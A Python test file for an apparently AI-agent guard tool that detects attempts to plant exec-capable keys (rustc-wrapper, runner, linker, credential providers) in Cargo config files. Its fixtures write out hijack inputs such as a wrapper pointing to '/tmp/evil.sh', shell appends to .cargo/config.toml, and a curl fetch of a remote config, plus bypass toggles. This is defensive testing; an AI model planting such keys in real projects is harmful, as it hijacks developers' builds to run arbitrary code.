"""Cargo config exec-hijack guard — blocks exec-capable keys (``rustc-wrapper``,
``runner``, ``linker``, ``credential-provider``, ...) planted in
``.cargo/config.toml``. Cargo runs the named program on the next ordinary
``cargo build``/``test``/``run``. Default mode is ``ask``; ``mode: deny`` is
exercised explicitly.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"

WRAPPER = '[build]\nrustc-wrapper = "/tmp/evil.sh"\n'


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content, tool="Write"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path, "content": content})


def _hit(ev, pol=EMPTY):
    d = evaluate(ev, pol)
    return d.rule == RULE, d


def test_write_rustc_wrapper_asks():
    ok, d = _hit(_write("proj/.cargo/config.toml", WRAPPER))
    assert ok and d.action == Action.ASK


def test_deny_mode():
    ok, d = _hit(_write("proj/.cargo/config.toml", WRAPPER), DENY)
    assert ok and d.action == Action.DENY


def test_legacy_name_and_windows_path():
    assert _hit(_write(r"C:\proj\.cargo\config", WRAPPER))[0]


def test_runner_and_linker_need_path():
    body = '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/x"\nlinker = "/tmp/ld"\n'
    assert _hit(_write(".cargo/config.toml", body))[0]
    assert not _hit(_write("notes/other.toml", body))[0]


def test_rustflags_linker_arg():
    body = '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/x"]\n'
    assert _hit(_write(".cargo/config.toml", '[build]\nrustflags = ["-C link-arg=x"]\n'))[0]
    assert _hit(_write(".cargo/config.toml", '[build]\nrustflags = ["-Clinker=/tmp/x"]\n'))[0]
    assert not _hit(_write(".cargo/config.toml", '[build]\nrustflags = ["-C", "opt-level=3"]\n'))[0]


def test_credential_provider():
    assert _hit(_write(".cargo/config.toml", '[registry]\nglobal-credential-providers = ["/tmp/p"]\n'))[0]
    assert _hit(_write(".cargo/config.toml", '[registry]\ncredential-provider = "/tmp/p"\n'))[0]


def test_staged_under_other_name_is_strong():
    assert _hit(_write("staging/tmp.txt", WRAPPER))[0]


def test_multiedit_and_mcp_shapes():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": ".cargo/config.toml", "edits": [{"new_string": WRAPPER}]})
    assert _hit(ev)[0]
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write",
                    args={"target": "/home/u/.cargo/config.toml", "text": '[target.a]\nrunner = "x"\n'})
    assert _hit(ev)[0]


def test_shell_forms():
    assert _hit(_shell("printf '[build]\\nrustc-wrapper = \"/tmp/e\"\\n' >> .cargo/config.toml"))[0]
    assert _hit(_shell("cat >> ~/.cargo/config.toml <<EOF\n[target.x]\nrunner = \"/tmp/e\"\nEOF"))[0]


def test_benign_not_flagged():
    assert not _hit(_write(".cargo/config.toml", '[build]\njobs = 4\n[net]\noffline = true\n'))[0]
    assert not _hit(_write(".cargo/config.toml", '[build]\nrustc-wrapper = ""\n'))[0]
    assert not _hit(_write("Cargo.toml", '[package]\nname = "linker"\n'))[0]
    assert not _hit(_shell("cargo build --release"))[0]
    assert not _hit(_shell("cat .cargo/config.toml"))[0]


def test_comment_only_not_flagged():
    assert not _hit(_write(".cargo/config.toml", '# TODO: rustc-wrapper = "sccache" later\n'))[0]
    assert not _hit(_shell('# rustc-wrapper = "x" in .cargo/config.toml\nls'))[0]


def test_human_escape_shell_only():
    assert not _hit(_shell("echo 'rustc-wrapper = \"sccache\"' >> .cargo/config.toml # aegis-allow"))[0]


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(_write(".cargo/config.toml", WRAPPER))[0]


def test_policy_allow_and_off_and_monitor():
    allow = Policy(cargo_exec={"allow": [r"vendor/.cargo"]})
    assert not _hit(_write("vendor/.cargo/config.toml", WRAPPER), allow)[0]
    assert _hit(_write("other/.cargo/config.toml", WRAPPER), allow)[0]
    assert not _hit(_write(".cargo/config.toml", WRAPPER), Policy(cargo_exec={"mode": "off"}))[0]
    assert not _hit(_write(".cargo/config.toml", WRAPPER), Policy(cargo_exec={"mode": "monitor"}))[0]


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://x.example/c"), EMPTY)
    assert d.action != Action.ALLOW


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("cargo_exec:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.cargo_exec == {"mode": "deny"}


def test_perf_large_input():
    big = "{" * 2_000_000 + "\n" + "a = 1\n" * 200_000
    t = time.time()
    _hit(_write(".cargo/config.toml", big))
    assert time.time() - t < 2
